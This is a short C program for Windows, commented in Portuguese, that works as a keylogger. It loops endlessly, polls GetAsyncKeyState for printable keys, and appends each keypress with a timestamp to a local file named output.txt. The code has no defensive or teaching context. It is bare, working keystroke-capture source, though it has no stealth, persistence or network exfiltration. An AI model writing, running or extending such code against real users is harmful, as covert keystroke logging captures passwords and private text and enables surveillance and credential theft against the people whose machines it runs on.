#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include <time.h>

void logKeystroke(FILE *file, char key) {
    time_t now = time(NULL);
    struct tm *timeinfo = localtime(&now);
    char timestamp[10];

    strftime(timestamp, sizeof(timestamp), "%H:%M:%S", timeinfo);
	
    fprintf(file, "[%s] %c\n", timestamp, key);
    fflush(file);
}

int main() {
    FILE *file;
    bool pressed[256] = { false }; 
    int tecla;

    file = fopen("output.txt", "a"); 

    if (file == NULL) {
        printf("err\n");
        return 1;
    }

    while (1) {
	// ascii 32 - 126 = numeros, letras maiusculas e minusculas e whitespace
        for (tecla = 32; tecla <= 126; tecla++) { 
            if (GetAsyncKeyState(tecla) & 0x8000) { 
                if (!pressed[tecla]) { 
                    logKeystroke(file, (char)tecla);
                    pressed[tecla] = true;
                }
            } else {
                pressed[tecla] = false; 
            }
        }
    }

    fclose(file); 
    return 0;
}

